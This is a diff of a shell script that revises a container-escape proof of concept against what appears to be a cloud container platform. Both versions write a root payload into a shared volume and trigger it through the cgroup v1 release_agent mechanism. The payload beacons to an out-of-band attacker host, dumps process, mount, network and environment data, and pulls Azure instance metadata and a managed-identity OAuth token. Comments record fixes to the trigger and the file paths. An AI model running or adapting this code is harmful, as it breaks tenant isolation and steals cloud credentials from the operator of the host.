@@ -219,58 +219,22 @@ report > "$WORKTREE/$OUT" 2>&1
 #   collector confirms execution even if the sdc write path fails.
 if [ "$DO_CGROUP_FIRE" = "1" ]; then
 {
-    echo "CGROUP_ESCAPE: === poc15 — gitRepo volume (sdc) as shared relay ==="
-    # Core insight: /dev/sdc is bind-mounted (not re-mounted) in the container.
-    # The init namespace has the SAME ext4 mount of /dev/sdc, just at a different
-    # path.  GCS uses the /run/mounts/scsi/mX/ scheme: sdb=m0 (pause image),
-    # sdc=m1 (gitRepo volume), sdd=m2 (first image layer), etc.
-    # We write the escape payload to /dev/sdc via the sidecar (at /mount/gitrepo/)
-    # and set release_agent to /run/mounts/scsi/m1/escape.sh (init-ns path).
-    # Writes are immediately visible to both sides (shared ext4 page cache).
-    # Fallback: also try m0, m2, overlay-upperdir in case the mX index is off.
+    echo "CGROUP_ESCAPE: === poc16 — correct mnt/ subpath + move-to-root trigger ==="
+    # Key discoveries from poc15:
+    #   1. MOUNT_POINT=/mount/gitrepo/mnt and PWD=/mount/gitrepo/mnt/test —
+    #      the ext4 volume root is /mount/gitrepo/ but the app container receives
+    #      a bind-mount of the /mnt/ subdirectory at /tmp/hooks/.
+    #   2. Writing to /mount/gitrepo/escape.sh (ext4 root) is NOT visible to
+    #      the app container or the init-ns agent path.  Must write to
+    #      /mount/gitrepo/mnt/escape.sh  (= init-ns: /run/mounts/scsi/m1/mnt/escape.sh).
+    #   3. Trigger flaw: sh -c "echo \$\$ > cgroup.procs" may run in the parent's
+    #      PID context (ash optimization), so the cgroup never truly empties.
+    #      Fix: move OUR OWN PID into esc$$ then move back to root → esc$$ empties.
+    #   4. The memory cgroup release_agent IS globally stored (visible in the app
+    #      container's /proc/mounts), so the path assignment works — only the
+    #      trigger or the file-path resolution was the problem.
 
-    # ── Find sidecar's mount point for /dev/sdc (8:32) ──────────────
-    SDC_MNT=$(awk '$3=="8:32"{print $5; exit}' /proc/self/mountinfo 2>/dev/null)
-    echo "CGROUP_ESCAPE: sidecar sdc mount = ${SDC_MNT:-NOT FOUND}"
-
-    # ── Build the init-ns payload and write to /dev/sdc ─────────────
-    # Init ns path for sdc = /run/mounts/scsi/m1/  (best guess from SCSI ordering)
-    # Write the payload as escape.sh in the volume root so it's at a fixed path.
-    ESCAPE_SH="${SDC_MNT:-/mount/gitrepo}/escape.sh"
-    printf '#!/bin/sh\n' > "$ESCAPE_SH"
-    printf 'OOB_HOST="%s"\n' "$OOB_HOST" >> "$ESCAPE_SH"
-    cat >> "$ESCAPE_SH" << 'INITNS_PAYLOAD'
-# Init namespace payload (cgroup v1 release_agent, runs as root in LCOW VM).
-# Output written to the same /dev/sdc volume (now accessible at $0's directory).
-OUT="$(dirname "$0")/ESCAPE_OUTPUT.txt"
-wget -qT5 -O/dev/null "http://${OOB_HOST}/INITNS_ESCAPE?pid=$$" 2>/dev/null
-{
-echo "=== CGROUP ESCAPE: LCOW VM init namespace ==="
-echo "pid=$$ date=$(date -u) id=$(id) hostname=$(hostname) uname=$(uname -r)"
-echo "--- /proc/self/mountinfo ---"; cat /proc/self/mountinfo 2>/dev/null | head -60
-echo "--- processes ---"; ps -ef 2>/dev/null
-echo "--- mounts ---"; cat /proc/mounts 2>/dev/null | head -60
-echo "--- network ---"; ip addr 2>/dev/null; ip route 2>/dev/null
-echo "--- /etc/hosts ---"; cat /etc/hosts 2>/dev/null
-echo "--- env pid1 ---"; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
-echo "--- GCS log ---"; tail -80 /run/gcs/gcs.log 2>/dev/null || echo "not found"
-echo "--- /run/gcs/ ---"; find /run/gcs/ -maxdepth 4 -ls 2>/dev/null | head -60
-echo "--- vsock ---"; cat /proc/net/vsock 2>/dev/null
-echo "--- IMDS ---"
-wget -qT5 --header="Metadata: true" \
-    -O- "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -c 8192
-echo "--- IMDS MSI ---"
-wget -qT5 --header="Metadata: true" \
-    -O- "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>/dev/null | head -c 4096
-echo "--- wireserver ---"; wget -qT3 -O- "http://168.63.129.16/" 2>/dev/null | head -c 2048
-echo "=== DONE ==="
-} > "$OUT" 2>&1
-INITNS_PAYLOAD
-    chmod +x "$ESCAPE_SH"
-    echo "CGROUP_ESCAPE: payload written to $ESCAPE_SH"
-    ls -la "$ESCAPE_SH" 2>&1
-
-    # Also write to upperdir/tmp/escape.sh as a fallback (overlayfs approach).
+    # ── Parse overlay upperdir (for fallback path) ───────────────────
     UPPERDIR=""
     while IFS= read -r _mline; do
         set -- $_mline; _mp="$5"; shift 6 2>/dev/null
@@ -280,77 +244,138 @@ INITNS_PAYLOAD
             shift 2; _ud="${1##*upperdir=}"; _ud="${_ud%%,*}"; [ -n "$_ud" ] && UPPERDIR="$_ud"; break
         fi
     done < /proc/self/mountinfo
-    echo "CGROUP_ESCAPE: upperdir=$UPPERDIR"
-    cp "$ESCAPE_SH" /tmp/.escape.sh 2>/dev/null && chmod +x /tmp/.escape.sh 2>/dev/null
 
-    # ── Try multiple init-ns paths for /dev/sdc ──────────────────────
-    # m1 = sdc is the primary guess.  m0/m2 as fallback.  Also try the
-    # upperdir overlay path used in previous rounds.
+    # ── Locate the gitRepo volume's mnt/ subdirectory ───────────────
+    SDC_MNT=$(awk '$3=="8:32"{print $5; exit}' /proc/self/mountinfo 2>/dev/null)
+    SDC_MNT_SUBDIR="${SDC_MNT}/mnt"
+    echo "CGROUP_ESCAPE: sdc_mnt=$SDC_MNT  subdir=$SDC_MNT_SUBDIR  upperdir=$UPPERDIR"
+
+    # ── Write payload to the correct path ───────────────────────────
+    # Place it in the mnt/ subdirectory so the init-ns can access it at
+    # /run/mounts/scsi/m1/mnt/escape.sh AND the app container reads it
+    # at /tmp/hooks/escape.sh.
+    ESCAPE_SH="${SDC_MNT_SUBDIR}/escape.sh"
+    printf '#!/bin/sh\n' > "$ESCAPE_SH"
+    printf 'OOB_HOST="%s"\n' "$OOB_HOST" >> "$ESCAPE_SH"
+    cat >> "$ESCAPE_SH" << 'INITNS_PAYLOAD'
+# Runs in LCOW VM init namespace (call_usermodehelper).
+# Output to same directory → sidecar reads it via /mount/gitrepo/mnt/ESCAPE_OUTPUT.txt
+OUT="$(dirname "$0")/ESCAPE_OUTPUT.txt"
+wget -qT5 -O/dev/null "http://${OOB_HOST}/INITNS_ESCAPE?pid=$$&cgroup=$1" 2>/dev/null
+{
+echo "=== CGROUP ESCAPE: LCOW VM INIT NAMESPACE ==="
+echo "pid=$$ cgroup_arg=$1 date=$(date -u)"
+id; uname -a
+echo "--- /proc/self/mountinfo (init-ns view) ---"
+cat /proc/self/mountinfo 2>/dev/null | head -60
+echo "--- processes ---"; ps -ef 2>/dev/null
+echo "--- /proc/mounts ---"; cat /proc/mounts 2>/dev/null | head -60
+echo "--- network ---"; ip addr 2>/dev/null; ip route 2>/dev/null
+echo "--- /etc/hosts ---"; cat /etc/hosts 2>/dev/null
+echo "--- env pid1 ---"; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
+echo "--- GCS log (tail 80) ---"; tail -80 /run/gcs/gcs.log 2>/dev/null || echo "not found"
+echo "--- /run/gcs/ layout ---"; find /run/gcs/ -maxdepth 4 -ls 2>/dev/null | head -80
+echo "--- vsock ---"; cat /proc/net/vsock 2>/dev/null; ls -la /dev/vsock 2>/dev/null
+echo "--- IMDS instance ---"
+wget -qT5 --header="Metadata: true" \
+    -O- "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -c 8192
+echo "--- IMDS identity token ---"
+wget -qT5 --header="Metadata: true" \
+    -O- "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>/dev/null | head -c 4096
+echo "--- wireserver ---"; wget -qT3 -O- "http://168.63.129.16/" 2>/dev/null | head -c 2048
+echo "=== DONE ==="
+} > "$OUT" 2>&1
+INITNS_PAYLOAD
+    chmod +x "$ESCAPE_SH"
+    echo "CGROUP_ESCAPE: payload written: $(ls -la $ESCAPE_SH 2>&1)"
+    cp "$ESCAPE_SH" /tmp/.escape.sh 2>/dev/null && chmod +x /tmp/.escape.sh
+
+    # ── Attempt escape with corrected paths and trigger ──────────────
     CG_MNT=/tmp/.cge_$$
     mkdir -p "$CG_MNT" 2>/dev/null
 
     for AGENT_PATH in \
+        "/run/mounts/scsi/m1/mnt/escape.sh" \
         "/run/mounts/scsi/m1/escape.sh" \
-        "/run/mounts/scsi/m2/escape.sh" \
-        "/run/mounts/scsi/m0/escape.sh" \
+        "/run/mounts/scsi/m0/mnt/escape.sh" \
+        "/run/mounts/scsi/m2/mnt/escape.sh" \
         "${UPPERDIR}/tmp/.escape.sh"
     do
         [ -z "$AGENT_PATH" ] && continue
+        echo "CGROUP_ESCAPE: trying $AGENT_PATH"
 
-        echo "CGROUP_ESCAPE: trying release_agent=$AGENT_PATH"
         umount "$CG_MNT" 2>/dev/null; rmdir "$CG_MNT" 2>/dev/null
         mkdir -p "$CG_MNT" 2>/dev/null
-        mount -t cgroup -o memory cgroup "$CG_MNT" 2>/dev/null || { echo "  mount failed"; break; }
+        mount -t cgroup -o memory cgroup "$CG_MNT" 2>/dev/null || { echo "  cgroup mount failed — aborting"; break; }
         echo "$AGENT_PATH" > "$CG_MNT/release_agent" 2>/dev/null
-        _ra=$(cat "$CG_MNT/release_agent" 2>/dev/null)
-        echo "CGROUP_ESCAPE:   release_agent stored as: $_ra"
         echo 1 > "$CG_MNT/notify_on_release" 2>/dev/null
-        mkdir -p "$CG_MNT/esc$$" 2>/dev/null
-        echo 1 > "$CG_MNT/esc$$/notify_on_release" 2>/dev/null
-        sh -c "echo \$\$ > $CG_MNT/esc$$/cgroup.procs; exit 0" 2>/dev/null
-        echo "CGROUP_ESCAPE:   trigger fired"
 
-        # Wait up to 15s per attempt.
+        CGCHILD="$CG_MNT/esc$$"
+        mkdir -p "$CGCHILD" 2>/dev/null
+        echo 1 > "$CGCHILD/notify_on_release" 2>/dev/null
+
+        # Move OUR OWN PID into esc$$ then immediately back to root.
+        # When our PID leaves esc$$, the cgroup becomes empty → release_agent fires.
+        echo $$ > "$CGCHILD/cgroup.procs" 2>/dev/null
+        _tasks_before=$(cat "$CGCHILD/tasks" 2>/dev/null | wc -l | tr -d ' ')
+        echo $$ > "$CG_MNT/cgroup.procs" 2>/dev/null  # move back to root
+        _tasks_after=$(cat "$CGCHILD/tasks" 2>/dev/null | wc -l | tr -d ' ')
+        echo "CGROUP_ESCAPE:   tasks before=$_tasks_before after=$_tasks_after (0=empty=fired)"
+
+        echo "CGROUP_ESCAPE:   waiting 30s for output..."
         _i=0
-        while [ $_i -lt 15 ]; do
-            [ -f "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" ] && break
-            [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]                   && break
-            [ -f /tmp/.escape_out.txt ]                            && break
+        while [ $_i -lt 30 ]; do
+            [ -f "$SDC_MNT_SUBDIR/ESCAPE_OUTPUT.txt" ]              && break
+            [ -f "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" ]   && break
+            [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]                     && break
             sleep 1; _i=$((_i+1))
         done
-        rmdir "$CG_MNT/esc$$" 2>/dev/null
-        umount "$CG_MNT" 2>/dev/null
-        rmdir "$CG_MNT" 2>/dev/null
 
-        if [ -f "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" ]; then
-            cp "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" "$WORKTREE/" 2>/dev/null
-            echo "CGROUP_ESCAPE: SUCCESS via $AGENT_PATH (sdc volume) after ${_i}s"
-            head -20 "$WORKTREE/ESCAPE_OUTPUT.txt" 2>&1
-            break
-        elif [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ] || [ -f /tmp/.escape_out.txt ]; then
-            [ -f /tmp/.escape_out.txt ] && cp /tmp/.escape_out.txt "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null
-            echo "CGROUP_ESCAPE: SUCCESS via overlay fallback after ${_i}s"
+        rmdir "$CGCHILD" 2>/dev/null
+        umount "$CG_MNT" 2>/dev/null; rmdir "$CG_MNT" 2>/dev/null
+
+        # Consolidate output
+        for _op in "$SDC_MNT_SUBDIR/ESCAPE_OUTPUT.txt" \
+                   "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" \
+                   "$WORKTREE/ESCAPE_OUTPUT.txt"; do
+            [ -f "$_op" ] && cp "$_op" "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null && break
+        done
+
+        if [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
+            echo "CGROUP_ESCAPE: SUCCESS via $AGENT_PATH after ${_i}s"
             head -20 "$WORKTREE/ESCAPE_OUTPUT.txt" 2>&1
             break
         else
-            echo "CGROUP_ESCAPE:   no output after ${_i}s for $AGENT_PATH"
+            echo "CGROUP_ESCAPE:   no output after ${_i}s"
         fi
     done
 
-    # ── Summarize ────────────────────────────────────────────────────
+    # ── Post-mortem if all attempts failed ───────────────────────────
     if [ ! -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
-        echo "CGROUP_ESCAPE: ALL paths failed — check OOB collector for beacon"
-        echo "  sdc_mnt=$SDC_MNT  upperdir=$UPPERDIR"
-        echo "  sdc/escape.sh: $(ls -la ${SDC_MNT:-/mount/gitrepo}/escape.sh 2>&1)"
-        echo "  /tmp/.escape.sh: $(ls -la /tmp/.escape.sh 2>&1)"
-        # dmesg via BusyBox on /dev/sda (try both bin/ and sbin/)
+        echo "CGROUP_ESCAPE: all paths failed — collecting diagnostics"
+        echo "  escape.sh: $(ls -la $ESCAPE_SH 2>&1)"
+        echo "  mnt subdir contents: $(ls -la ${SDC_MNT_SUBDIR}/ 2>&1 | head -5)"
+        # Read kernel log for usermodehelper errors
+        echo "--- /dev/kmsg (last 40 entries, for call_usermodehelper errors) ---"
+        dd if=/dev/kmsg bs=4096 count=64 iflag=nonblock 2>/dev/null | \
+            strings | grep -iE 'helper|cgroup|release|LCOW' | tail -20 || \
+            echo "  (no kmsg entries found)"
+        # BusyBox dmesg from /dev/sda
         SDA_MNT=/tmp/.mnt_sda
         mkdir -p "$SDA_MNT" 2>/dev/null
         mount -o ro /dev/sda "$SDA_MNT" 2>/dev/null
-        for dmsg in "$SDA_MNT/bin/dmesg" "$SDA_MNT/sbin/dmesg" "$SDA_MNT/usr/bin/dmesg"; do
-            [ -x "$dmsg" ] && { echo "--- dmesg (last 30 lines) ---"; "$dmsg" 2>/dev/null | tail -30; break; }
+        for _dpath in "$SDA_MNT/bin/busybox" "$SDA_MNT/bin/dmesg" "$SDA_MNT/sbin/dmesg"; do
+            [ -x "$_dpath" ] || continue
+            echo "--- dmesg via $_dpath (last 30 lines) ---"
+            if [ "${_dpath##*/}" = "busybox" ]; then
+                "$_dpath" dmesg 2>/dev/null | tail -30
+            else
+                "$_dpath" 2>/dev/null | tail -30
+            fi
+            break
         done
         umount "$SDA_MNT" 2>/dev/null
+        rmdir "$SDA_MNT" 2>/dev/null
     fi
 } >> "$WORKTREE/$OUT" 2>&1
 fi
